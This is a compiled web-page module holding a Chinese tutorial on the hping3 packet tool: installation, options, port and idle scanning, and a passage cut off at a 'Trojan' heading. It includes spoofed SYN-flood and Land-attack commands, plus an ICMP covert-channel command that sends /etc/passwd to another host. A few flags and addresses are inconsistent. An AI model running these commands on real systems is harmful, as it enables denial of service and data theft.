import{_ as s,c as n,o as a,a as l}from"./app.f6b8b16b.js";const u=JSON.parse('{"title":"hping3","description":"","frontmatter":{},"headers":[{"level":2,"title":"\u8865\u5145\u8BF4\u660E","slug":"\u8865\u5145\u8BF4\u660E","link":"#\u8865\u5145\u8BF4\u660E","children":[{"level":3,"title":"\u5B89\u88C5","slug":"\u5B89\u88C5","link":"#\u5B89\u88C5","children":[]},{"level":3,"title":"\u9009\u9879","slug":"\u9009\u9879","link":"#\u9009\u9879","children":[]},{"level":3,"title":"Hping3\u529F\u80FD","slug":"hping3\u529F\u80FD","link":"#hping3\u529F\u80FD","children":[]},{"level":3,"title":"# \xA0\u9632\u706B\u5899\u6D4B\u8BD5","slug":"\u9632\u706B\u5899\u6D4B\u8BD5","link":"#\u9632\u706B\u5899\u6D4B\u8BD5","children":[]},{"level":3,"title":"# \u7AEF\u53E3\u626B\u63CF","slug":"\u7AEF\u53E3\u626B\u63CF","link":"#\u7AEF\u53E3\u626B\u63CF","children":[]},{"level":3,"title":"# Idle\u626B\u63CF","slug":"idle\u626B\u63CF","link":"#idle\u626B\u63CF","children":[]},{"level":3,"title":"# \u62D2\u7EDD\u670D\u52A1\u653B\u51FB","slug":"\u62D2\u7EDD\u670D\u52A1\u653B\u51FB","link":"#\u62D2\u7EDD\u670D\u52A1\u653B\u51FB","children":[]},{"level":3,"title":"# \u6587\u4EF6\u4F20\u8F93","slug":"\u6587\u4EF6\u4F20\u8F93","link":"#\u6587\u4EF6\u4F20\u8F93","children":[]},{"level":3,"title":"# \u6728\u9A6C\u529F\u80FD","slug":"\u6728\u9A6C\u529F\u80FD","link":"#\u6728\u9A6C\u529F\u80FD","children":[]}]}],"relativePath":"linux/command/pages/hping3.md","lastUpdated":1666509709000}'),p={name:"linux/command/pages/hping3.md"},e=l(`<h1 id="hping3" tabindex="-1">hping3 <a class="header-anchor" href="#hping3" aria-hidden="true">#</a></h1><p>\u6D4B\u8BD5\u7F51\u7EDC\u53CA\u4E3B\u673A\u7684\u5B89\u5168</p><h2 id="\u8865\u5145\u8BF4\u660E" tabindex="-1">\u8865\u5145\u8BF4\u660E <a class="header-anchor" href="#\u8865\u5145\u8BF4\u660E" aria-hidden="true">#</a></h2><p><strong>hping</strong> \u662F\u7528\u4E8E\u751F\u6210\u548C\u89E3\u6790TCPIP\u534F\u8BAE\u6570\u636E\u5305\u7684\u5F00\u6E90\u5DE5\u5177\u3002\u521B\u4F5C\u8005\u662FSalvatore Sanfilippo\u3002\u76EE\u524D\u6700\u65B0\u7248\u662Fhping3\uFF0C\u652F\u6301\u4F7F\u7528tcl\u811A\u672C\u81EA\u52A8\u5316\u5730\u8C03\u7528\u5176API\u3002hping\u662F\u5B89\u5168\u5BA1\u8BA1\u3001\u9632\u706B\u5899\u6D4B\u8BD5\u7B49\u5DE5\u4F5C\u7684\u6807\u914D\u5DE5\u5177\u3002hping\u4F18\u52BF\u5728\u4E8E\u80FD\u591F\u5B9A\u5236\u6570\u636E\u5305\u7684\u5404\u4E2A\u90E8\u5206\uFF0C\u56E0\u6B64\u7528\u6237\u53EF\u4EE5\u7075\u6D3B\u5BF9\u76EE\u6807\u673A\u8FDB\u884C\u7EC6\u81F4\u5730\u63A2\u6D4B\u3002</p><h3 id="\u5B89\u88C5" tabindex="-1">\u5B89\u88C5 <a class="header-anchor" href="#\u5B89\u88C5" aria-hidden="true">#</a></h3><div class="language-shell line-numbers-mode"><button class="copy"></button><span class="lang">shell</span><pre><code><span class="line"><span style="color:#A6ACCD;">yum install libpcap-devel tc-devel</span></span>
<span class="line"><span style="color:#A6ACCD;">ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h</span></span>
<span class="line"><span style="color:#A6ACCD;">wget http://www.hping.org/hping3-20051105.tar.gz</span></span>
<span class="line"><span style="color:#A6ACCD;">tar zxvf hping3-20051105.tar.gz</span></span>
<span class="line"><span style="color:#82AAFF;">cd</span><span style="color:#A6ACCD;"> hping3-20051105</span></span>
<span class="line"><span style="color:#A6ACCD;">./configure</span></span>
<span class="line"><span style="color:#A6ACCD;">make</span></span>
<span class="line"><span style="color:#A6ACCD;">make install</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="\u9009\u9879" tabindex="-1">\u9009\u9879 <a class="header-anchor" href="#\u9009\u9879" aria-hidden="true">#</a></h3><div class="language-shell line-numbers-mode"><button class="copy"></button><span class="lang">shell</span><pre><code><span class="line"><span style="color:#A6ACCD;">-H --help \u663E\u793A\u5E2E\u52A9\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-v -VERSION \u7248\u672C\u4FE1\u606F\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-c --count count \u53D1\u9001\u6570\u636E\u5305\u7684\u6B21\u6570 \u5173\u4E8Ecountreached_timeout \u53EF\u4EE5\u5728hping2.h\u91CC\u7F16\u8F91\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-i --interval \u5305\u53D1\u9001\u95F4\u9694\u65F6\u95F4\uFF08\u5355\u4F4D\u662F\u6BEB\u79D2\uFF09\u7F3A\u7701\u65F6\u95F4\u662F1\u79D2,\u6B64\u529F\u80FD\u5728\u589E\u52A0\u4F20\u8F93\u7387\u4E0A\u5F88\u91CD\u8981,\u5728idle/spoofing\u626B\u63CF\u65F6\u6B64\u529F\u80FD\u4E5F\u4F1A\u88AB\u7528\u5230,\u4F60\u53EF\u4EE5\u53C2\u8003hping-howto\u83B7\u5F97\u66F4\u591A\u4FE1\u606F-fast \u6BCF\u79D2\u53D110\u4E2A\u6570\u636E\u5305\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-n -nmeric \u6570\u5B57\u8F93\u51FA\uFF0C\u8C61\u5F81\u6027\u8F93\u51FA\u4E3B\u673A\u5730\u5740\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-q -quiet \u9000\u51FA\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-I --interface interface name \u65E0\u975E\u5C31\u662Feth0\u4E4B\u7C7B\u7684\u53C2\u6570\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-v --verbose \u663E\u793A\u5F88\u591A\u4FE1\u606F\uFF0CTCP\u56DE\u5E94\u4E00\u822C\u5982\uFF1Alen=46 ip=192.168.1.1 flags=RADF seq=0 ttl=255 id=0 win=0 rtt=0.4ms tos=0 iplen=40 seq=0 ack=1380893504 sum=2010 urp=0</span></span>
<span class="line"><span style="color:#A6ACCD;">-D --debug \u8FDB\u5165debug\u6A21\u5F0F\u5F53\u4F60\u9047\u5230\u9EBB\u70E6\u65F6\uFF0C\u6BD4\u5982\u7528HPING\u9047\u5230\u4E00\u4E9B\u4E0D\u5408\u4F60\u4E60\u60EF\u7684\u65F6\u5019\uFF0C\u4F60\u53EF\u4EE5\u7528\u6B64\u6A21\u5F0F\u4FEE\u6539HPING\uFF0C\uFF08INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......\uFF09</span></span>
<span class="line"><span style="color:#A6ACCD;">-z --bind \u5FEB\u6377\u952E\u7684\u4F7F\u7528\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-Z --unbind \u6D88\u9664\u5FEB\u6377\u952E\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-O --rawip RAWIP\u6A21\u5F0F\uFF0C\u5728\u6B64\u6A21\u5F0F\u4E0BHPING\u4F1A\u53D1\u9001\u5E26\u6570\u636E\u7684IP\u5934\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-1 --icmp ICMP\u6A21\u5F0F\uFF0C\u6B64\u6A21\u5F0F\u4E0BHPING\u4F1A\u53D1\u9001IGMP\u5E94\u7B54\u62A5\uFF0C\u4F60\u53EF\u4EE5\u7528--ICMPTYPE --ICMPCODE\u9009\u9879\u53D1\u9001\u5176\u4ED6\u7C7B\u578B/\u6A21\u5F0F\u7684ICMP\u62A5\u6587\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-2 --udp UDP \u6A21\u5F0F\uFF0C\u7F3A\u7701\u4E0B\uFF0CHPING\u4F1A\u53D1\u9001UDP\u62A5\u6587\u5230\u4E3B\u673A\u76840\u7AEF\u53E3\uFF0C\u4F60\u53EF\u4EE5\u7528--baseport --destport --keep\u9009\u9879\u6307\u5B9A\u5176\u6A21\u5F0F\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-9 --listen signatuer hping\u7684listen\u6A21\u5F0F\uFF0C\u7528\u6B64\u6A21\u5F0F\uFF0CHPING\u4F1A\u63A5\u6536\u6307\u5B9A\u7684\u6570\u636E\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-a --spoof hostname \u4F2A\u9020IP\u653B\u51FB\uFF0C\u9632\u706B\u5899\u5C31\u4E0D\u4F1A\u8BB0\u5F55\u4F60\u7684\u771F\u5B9EIP\u4E86\uFF0C\u5F53\u7136\u56DE\u5E94\u7684\u5305\u4F60\u4E5F\u63A5\u6536\u4E0D\u5230\u4E86\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-t --ttl </span><span style="color:#F78C6C;">time</span><span style="color:#A6ACCD;"> to live \u53EF\u4EE5\u6307\u5B9A\u53D1\u51FA\u5305\u7684TTL\u503C\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-H --ipproto \u5728RAW IP\u6A21\u5F0F\u91CC\u9009\u62E9IP\u534F\u8BAE\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-w --WINID UNIX ,WINDIWS\u7684id\u56DE\u5E94\u4E0D\u540C\u7684\uFF0C\u8FD9\u9009\u9879\u53EF\u4EE5\u8BA9\u4F60\u7684ID\u56DE\u5E94\u548CWINDOWS\u4E00\u6837\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-r --rel \u66F4\u6539ID\u7684\uFF0C\u53EF\u4EE5\u8BA9ID\u66FE\u9012\u51CF\u8F93\u51FA\uFF0C\u8BE6\u89C1HPING-HOWTO\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-F --FRAG \u66F4\u6539\u5305\u7684FRAG\uFF0C\u8FD9\u53EF\u4EE5\u6D4B\u8BD5\u5BF9\u65B9\u5BF9\u4E8E\u5305\u788E\u7247\u7684\u5904\u7406\u80FD\u529B\uFF0C\u7F3A\u7701\u7684\u201Cvirtual mtu\u201D\u662F16\u5B57\u8282\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-x --morefrag \u6B64\u529F\u80FD\u53EF\u4EE5\u53D1\u9001\u788E\u7247\u4F7F\u4E3B\u673A\u5FD9\u4E8E\u6062\u590D\u788E\u7247\u800C\u9020\u6210\u4E3B\u673A\u7684\u62D2\u7EDD\u670D\u52A1\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-y -dontfrag \u53D1\u9001\u4E0D\u53EF\u6062\u590D\u7684IP\u788E\u7247\uFF0C\u8FD9\u53EF\u4EE5\u8BA9\u4F60\u4E86\u89E3\u66F4\u591A\u7684MTU PATH DISCOVERY\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-G --fragoff fragment offset value </span><span style="color:#82AAFF;">set</span><span style="color:#A6ACCD;"> the fragment offset</span></span>
<span class="line"><span style="color:#A6ACCD;">-m --mtu mtu value \u7528\u6B64\u9879\u540EID\u6570\u503C\u53D8\u5F97\u5F88\u5927\uFF0C50000\u6CA1\u6307\u5B9A\u6B64\u9879\u65F63000-20000\u5DE6\u53F3\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-G --rroute \u8BB0\u5F55\u8DEF\u7531\uFF0C\u53EF\u4EE5\u770B\u5230\u8BE6\u6089\u7684\u6570\u636E\u7B49\u7B49\uFF0C\u6700\u591A\u53EF\u4EE5\u7ECF\u8FC79\u4E2A\u8DEF\u7531\uFF0C\u5373\u4F7F\u4E3B\u673A\u5C4F\u853D\u4E86ICMP\u62A5\u6587\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-C --ICMPTYPE </span><span style="color:#82AAFF;">type</span><span style="color:#A6ACCD;"> \u6307\u5B9AICMP\u7C7B\u578B\uFF0C\u7F3A\u7701\u662FICMP </span><span style="color:#82AAFF;">echo</span><span style="color:#A6ACCD;"> REQUEST\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-K --ICMPCODE CODE \u6307\u5B9AICMP\u4EE3\u53F7\uFF0C\u7F3A\u77010\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">--icmp-ipver \u628AIP\u7248\u672C\u4E5F\u63D2\u5165IP\u5934\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">--icmp-iphlen \u8BBE\u7F6EIP\u5934\u7684\u957F\u5EA6\uFF0C\u7F3A\u7701\u4E3A5\uFF0832\u5B57\u8282\uFF09\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">--icmp-iplen \u8BBE\u7F6EIP\u5305\u957F\u5EA6\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">--icmp-ipid \u8BBE\u7F6EICMP\u62A5\u6587IP\u5934\u7684ID\uFF0C\u7F3A\u7701\u662FRANDOM\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">--icmp-ipproto \u8BBE\u7F6E\u534F\u8BAE\u7684\uFF0C\u7F3A\u7701\u662FTCP\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-icmp-cksum \u8BBE\u7F6E\u6821\u9A8C\u548C\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-icmp-ts </span><span style="color:#82AAFF;">alias</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">for</span><span style="color:#A6ACCD;"> --icmptype 13 </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">to send ICMP timestamp requests</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">--icmp-addr Alias </span><span style="color:#89DDFF;">for</span><span style="color:#A6ACCD;"> --icmptype 17 </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">to send ICMP address mask requests</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">-s --baseport </span><span style="color:#82AAFF;">source</span><span style="color:#A6ACCD;"> port hping \u7528\u6E90\u7AEF\u53E3\u731C\u6D4B\u56DE\u5E94\u7684\u5305\uFF0C\u5B83\u4ECE\u4E00\u4E2A\u57FA\u672C\u7AEF\u53E3\u8BA1\u6570\uFF0C\u6BCF\u6536\u4E00\u4E2A\u5305\uFF0C\u7AEF\u53E3\u4E5F\u52A01\uFF0C\u8FD9\u89C4\u5219\u4F60\u53EF\u4EE5\u81EA\u5DF1\u5B9A\u4E49\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-p --deskport </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">+</span><span style="color:#89DDFF;">][</span><span style="color:#A6ACCD;">+</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">desk port \u8BBE\u7F6E\u76EE\u6807\u7AEF\u53E3\uFF0C\u7F3A\u7701\u4E3A0\uFF0C\u4E00\u4E2A\u52A0\u53F7\u8BBE\u7F6E\u4E3A:\u6BCF\u53D1\u9001\u4E00\u4E2A\u8BF7\u6C42\u5305\u5230\u8FBE\u540E\uFF0C\u7AEF\u53E3\u52A01\uFF0C\u4E24\u4E2A\u52A0\u53F7\u4E3A\uFF1A\u6BCF\u53D1\u4E00\u4E2A\u5305\uFF0C\u7AEF\u53E3\u6570\u52A01\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">--keep \u4E0A\u9762\u8BF4\u8FC7\u4E86\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-w --win \u53D1\u7684\u5927\u5C0F\u548Cwindows\u4E00\u6837\u5927\uFF0C64BYTE\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-O --tcpoff Set fake tcp data offset. Normal data offset is tcphdrlen / 4.</span></span>
<span class="line"><span style="color:#A6ACCD;">-m --tcpseq \u8BBE\u7F6ETCP\u5E8F\u5217\u6570\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-l --tcpck \u8BBE\u7F6ETCP ack\u3002</span></span>
<span class="line"><span style="color:#A6ACCD;">-Q --seqnum \u641C\u96C6\u5E8F\u5217\u53F7\u7684\uFF0C\u8FD9\u5BF9\u4E8E\u4F60\u5206\u6790TCP\u5E8F\u5217\u53F7\u6709\u5F88\u5927\u4F5C\u7528\u3002</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><h3 id="hping3\u529F\u80FD" tabindex="-1">Hping3\u529F\u80FD <a class="header-anchor" href="#hping3\u529F\u80FD" aria-hidden="true">#</a></h3><p>Hping3\u4E3B\u8981\u6709\u4EE5\u4E0B\u5178\u578B\u529F\u80FD\u5E94\u7528\uFF1A</p><h3 id="\u9632\u706B\u5899\u6D4B\u8BD5" tabindex="-1"># \xA0\u9632\u706B\u5899\u6D4B\u8BD5 <a class="header-anchor" href="#\u9632\u706B\u5899\u6D4B\u8BD5" aria-hidden="true">#</a></h3><p>\u4F7F\u7528Hping3\u6307\u5B9A\u5404\u79CD\u6570\u636E\u5305\u5B57\u6BB5\uFF0C\u4F9D\u6B21\u5BF9\u9632\u706B\u5899\u8FDB\u884C\u8BE6\u7EC6\u6D4B\u8BD5\u3002\u8BF7\u53C2\u8003\uFF1A<a href="http://0daysecurity.com/articles/hping3_examples.html" target="_blank" rel="noreferrer">http://0daysecurity.com/articles/hping3_examples.html</a></p><p>\u6D4B\u8BD5\u9632\u706B\u5899\u5BF9ICMP\u5305\u7684\u53CD\u5E94\u3001\u662F\u5426\u652F\u6301traceroute\u3001\u662F\u5426\u5F00\u653E\u67D0\u4E2A\u7AEF\u53E3\u3001\u5BF9\u9632\u706B\u5899\u8FDB\u884C\u62D2\u7EDD\u670D\u52A1\u653B\u51FB\uFF08DoS attack\uFF09\u3002\u4F8B\u5982\uFF0C\u4EE5LandAttack\u65B9\u5F0F\u6D4B\u8BD5\u76EE\u6807\u9632\u706B\u5899\uFF08Land Attack\u662F\u5C06\u53D1\u9001\u6E90\u5730\u5740\u8BBE\u7F6E\u4E3A\u4E0E\u76EE\u6807\u5730\u5740\u76F8\u540C\uFF0C\u8BF1\u4F7F\u76EE\u6807\u673A\u4E0E\u81EA\u5DF1\u4E0D\u505C\u5730\u5EFA\u7ACB\u8FDE\u63A5\uFF09\u3002</p><div class="language-shell line-numbers-mode"><button class="copy"></button><span class="lang">shell</span><pre><code><span class="line"><span style="color:#A6ACCD;">hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="\u7AEF\u53E3\u626B\u63CF" tabindex="-1"># \u7AEF\u53E3\u626B\u63CF <a class="header-anchor" href="#\u7AEF\u53E3\u626B\u63CF" aria-hidden="true">#</a></h3><p>Hping3\u4E5F\u53EF\u4EE5\u5BF9\u76EE\u6807\u7AEF\u53E3\u8FDB\u884C\u626B\u63CF\u3002Hping3\u652F\u6301\u6307\u5B9ATCP\u5404\u4E2A\u6807\u5FD7\u4F4D\u3001\u957F\u5EA6\u7B49\u4FE1\u606F\u3002\u4EE5\u4E0B\u793A\u4F8B\u53EF\u7528\u4E8E\u63A2\u6D4B\u76EE\u6807\u673A\u768480\u7AEF\u53E3\u662F\u5426\u5F00\u653E\uFF1A</p><div class="language-shell line-numbers-mode"><button class="copy"></button><span class="lang">shell</span><pre><code><span class="line"><span style="color:#A6ACCD;">hping3 -I eth0  -S 192.168.10.1 -p 80</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>\u5176\u4E2D<code>-I eth0</code>\u6307\u5B9A\u4F7F\u7528eth0\u7AEF\u53E3\uFF0C<code>-S</code>\u6307\u5B9ATCP\u5305\u7684\u6807\u5FD7\u4F4DSYN\uFF0C<code>-p 80</code>\u6307\u5B9A\u63A2\u6D4B\u7684\u76EE\u7684\u7AEF\u53E3\u3002</p><p>hping3\u652F\u6301\u975E\u5E38\u4E30\u5BCC\u7684\u7AEF\u53E3\u63A2\u6D4B\u65B9\u5F0F\uFF0Cnmap\u62E5\u6709\u7684\u626B\u63CF\u65B9\u5F0Fhping3\u51E0\u4E4E\u90FD\u652F\u6301\uFF08\u9664\u5F00connect\u65B9\u5F0F\uFF0C\u56E0\u4E3AHping3\u4EC5\u53D1\u9001\u4E0E\u63A5\u6536\u5305\uFF0C\u4E0D\u4F1A\u7EF4\u62A4\u8FDE\u63A5\uFF0C\u6240\u4EE5\u4E0D\u652F\u6301connect\u65B9\u5F0F\u63A2\u6D4B\uFF09\u3002\u800C\u4E14Hping3\u80FD\u591F\u5BF9\u53D1\u9001\u7684\u63A2\u6D4B\u8FDB\u884C\u66F4\u52A0\u7CBE\u7EC6\u7684\u63A7\u5236\uFF0C\u65B9\u4FBF\u7528\u6237\u5FAE\u8C03\u63A2\u6D4B\u7ED3\u679C\u3002\u5F53\u7136\uFF0CHping3\u7684\u7AEF\u53E3\u626B\u63CF\u6027\u80FD\u53CA\u7EFC\u5408\u5904\u7406\u80FD\u529B\uFF0C\u65E0\u6CD5\u4E0ENmap\u76F8\u6BD4\u3002\u4E00\u822C\u4F7F\u7528\u5B83\u4EC5\u5BF9\u5C11\u91CF\u4E3B\u673A\u7684\u5C11\u91CF\u7AEF\u53E3\u8FDB\u884C\u626B\u63CF\u3002</p><h3 id="idle\u626B\u63CF" tabindex="-1"># Idle\u626B\u63CF <a class="header-anchor" href="#idle\u626B\u63CF" aria-hidden="true">#</a></h3><p>Idle\u626B\u63CF\uFF08Idle Scanning\uFF09\u662F\u4E00\u79CD\u533F\u540D\u626B\u63CF\u8FDC\u7A0B\u4E3B\u673A\u7684\u65B9\u5F0F\uFF0C\u8BE5\u65B9\u5F0F\u4E5F\u662F\u6709Hping3\u7684\u4F5C\u8005Salvatore Sanfilippo\u53D1\u660E\u7684\uFF0C\u76EE\u524DIdle\u626B\u63CF\u5728Nmap\u4E2D\u4E5F\u6709\u5B9E\u73B0\u3002</p><p>\u8BE5\u626B\u63CF\u539F\u7406\u662F\uFF1A\u5BFB\u627E\u4E00\u53F0idle\u4E3B\u673A\uFF08\u8BE5\u4E3B\u673A\u6CA1\u6709\u4EFB\u4F55\u7684\u7F51\u7EDC\u6D41\u91CF\uFF0C\u5E76\u4E14IPID\u662F\u9010\u4E2A\u589E\u957F\u7684\uFF09\uFF0C\u653B\u51FB\u7AEF\u4E3B\u673A\u5148\u5411idle\u4E3B\u673A\u53D1\u9001\u63A2\u6D4B\u5305\uFF0C\u4ECE\u56DE\u590D\u5305\u4E2D\u83B7\u53D6\u5176IPID\u3002\u5192\u5145idle\u4E3B\u673A\u7684IP\u5730\u5740\u5411\u8FDC\u7A0B\u4E3B\u673A\u7684\u7AEF\u53E3\u53D1\u9001SYN\u5305\uFF08\u6B64\u5904\u5047\u8BBE\u4E3ASYN\u5305\uFF09\uFF0C\u6B64\u65F6\u5982\u679C\u8FDC\u7A0B\u4E3B\u673A\u7684\u76EE\u7684\u7AEF\u53E3\u5F00\u653E\uFF0C\u90A3\u4E48\u4F1A\u56DE\u590DSYN/ACK\uFF0C\u6B64\u65F6idle\u4E3B\u673A\u6536\u5230SYN/ACK\u540E\u56DE\u590DRST\u5305\u3002\u7136\u540E\u653B\u51FB\u7AEF\u4E3B\u673A\u518D\u5411idle\u4E3B\u673A\u53D1\u9001\u63A2\u6D4B\u5305\uFF0C\u83B7\u53D6\u5176IPID\u3002\u90A3\u4E48\u5BF9\u6BD4\u4E24\u6B21\u7684IPID\u503C\uFF0C\u6211\u4EEC\u5C31\u53EF\u4EE5\u5224\u65AD\u8FDC\u7A0B\u4E3B\u673A\u662F\u5426\u56DE\u590D\u4E86\u6570\u636E\u5305\uFF0C\u4ECE\u800C\u95F4\u63A5\u5730\u63A8\u6D4B\u5176\u7AEF\u53E3\u72B6\u6001\u3002</p><h3 id="\u62D2\u7EDD\u670D\u52A1\u653B\u51FB" tabindex="-1"># \u62D2\u7EDD\u670D\u52A1\u653B\u51FB <a class="header-anchor" href="#\u62D2\u7EDD\u670D\u52A1\u653B\u51FB" aria-hidden="true">#</a></h3><p>\u4F7F\u7528Hping3\u53EF\u4EE5\u5F88\u65B9\u4FBF\u6784\u5EFA\u62D2\u7EDD\u670D\u52A1\u653B\u51FB\u3002\u6BD4\u5982\u5BF9\u76EE\u6807\u673A\u53D1\u8D77\u5927\u91CFSYN\u8FDE\u63A5\uFF0C\u4F2A\u9020\u6E90\u5730\u5740\u4E3A192.168.10.99\uFF0C\u5E76\u4F7F\u75281000\u5FAE\u79D2\u7684\u95F4\u9694\u53D1\u9001\u5404\u4E2ASYN\u5305\u3002</p><div class="language-shell line-numbers-mode"><button class="copy"></button><span class="lang">shell</span><pre><code><span class="line"><span style="color:#A6ACCD;">hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>\u5176\u4ED6\u653B\u51FB\u5982smurf\u3001teardrop\u3001land attack\u7B49\u4E5F\u5F88\u5BB9\u6613\u6784\u5EFA\u51FA\u6765\u3002</p><h3 id="\u6587\u4EF6\u4F20\u8F93" tabindex="-1"># \u6587\u4EF6\u4F20\u8F93 <a class="header-anchor" href="#\u6587\u4EF6\u4F20\u8F93" aria-hidden="true">#</a></h3><p>Hping3\u652F\u6301\u901A\u8FC7TCP/UDP/ICMP\u7B49\u5305\u6765\u8FDB\u884C\u6587\u4EF6\u4F20\u8F93\u3002\u76F8\u5F53\u4E8E\u501F\u52A9TCP/UDP/ICMP\u5305\u5EFA\u7ACB\u9690\u79D8\u96A7\u9053\u901A\u8BAF\u3002\u5B9E\u73B0\u65B9\u5F0F\u662F\u5F00\u542F\u76D1\u542C\u7AEF\u53E3\uFF0C\u5BF9\u68C0\u6D4B\u5230\u7684\u7B7E\u540D\uFF08\u7B7E\u540D\u4E3A\u7528\u6237\u6307\u5B9A\u7684\u5B57\u7B26\u4E32\uFF09\u7684\u5185\u5BB9\u8FDB\u884C\u76F8\u5E94\u7684\u89E3\u6790\u3002\u5728\u63A5\u6536\u7AEF\u5F00\u542F\u670D\u52A1\uFF1A</p><div class="language-shell line-numbers-mode"><button class="copy"></button><span class="lang">shell</span><pre><code><span class="line"><span style="color:#A6ACCD;">hping3 192.168.1.159--listen signature --safe  --icmp</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>\u76D1\u542CICMP\u5305\u4E2D\u7684\u7B7E\u540D\uFF0C\u6839\u636E\u7B7E\u540D\u89E3\u6790\u51FA\u6587\u4EF6\u5185\u5BB9\u3002</p><p>\u5728\u53D1\u9001\u7AEF\u4F7F\u7528\u7B7E\u540D\u6253\u5305\u7684ICMP\u5305\u53D1\u9001\u6587\u4EF6\uFF1A</p><div class="language-shell line-numbers-mode"><button class="copy"></button><span class="lang">shell</span><pre><code><span class="line"><span style="color:#A6ACCD;">hping3 192.168.1.108--icmp </span><span style="color:#89DDFF;">?</span><span style="color:#A6ACCD;">d 100 --sign signature --file /etc/passwd</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>\u5C06<code>/etc/passwd</code>\u5BC6\u7801\u6587\u4EF6\u901A\u8FC7ICMP\u5305\u4F20\u7ED9192.168.10.44\u4E3B\u673A\u3002\u53D1\u9001\u5305\u5927\u5C0F\u4E3A100\u5B57\u8282\uFF08-d 100\uFF09\uFF0C\u53D1\u9001\u7B7E\u540D\u4E3Asignature(-sign signature)\u3002</p><h3 id="\u6728\u9A6C\u529F\u80FD" tabindex="-1"># \u6728\u9A6C\u529F\u80FD <a class="header-anchor" href="#\u6728\u9A6C\u529F\u80FD" 